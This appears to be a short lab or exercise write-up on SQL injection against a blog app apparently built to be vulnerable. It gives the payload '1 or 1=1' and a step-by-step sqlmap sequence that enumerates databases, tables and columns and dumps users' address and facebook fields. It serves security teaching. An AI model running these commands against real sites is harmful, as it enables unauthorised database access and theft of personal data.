# SQL injection 

## SQLi in PostURL

Look at the URL value of the Post page, it could be vulnerable so try entering the payload `1 or 1=1` and the site returns all the posts in the database.

![image](https://user-images.githubusercontent.com/63194321/132512881-bafa5801-e011-4d2b-9d93-554ab310152b.png)

### Solution

Because we have identified the web has been SQLi, we can use sqlmap to attack to get data.

B1. Start Sqlmap and enter command to scan for `sqli` vulnerabilities:

`sqlmap -u https://blog-vul.herokuapp.com/post/1 --batch`

![image](https://user-images.githubusercontent.com/63194321/132514620-a0461970-1a66-4020-b964-d29e07edc21d.png)

B2. Define a list of databases:

`sqlmap -u https://blog-vul.herokuapp.com/post/1 --batch -dbs`

![image](https://user-images.githubusercontent.com/63194321/132514974-21d6fb4f-a28f-4a49-98d4-b06a6f421684.png)

B3. Identify the tables in the database:

`sqlmap -u https://blog-vul.herokuapp.com/post/1 --batch -D public -tables`

![image](https://user-images.githubusercontent.com/63194321/132515143-ab63af90-e875-482c-a97d-260182a9fd1d.png)

B4.  Define columns in tables:

`sqlmap -u https://blog-vul.herokuapp.com/post/1 --batch -D public -T blogapp_userprofile -columns`

![image](https://user-images.githubusercontent.com/63194321/132515937-1002ad48-2c16-45fe-a06b-573d4ab3373b.png)


B5. Get the address value, facebook link of users.

`sqlmap -u https://blog-vul.herokuapp.com/post/1 --batch -D public -T blogapp_userprofile -C address,facebook --dump`

![image](https://user-images.githubusercontent.com/63194321/132516371-564f7d1e-d631-412c-a24e-2032a255b77e.png)
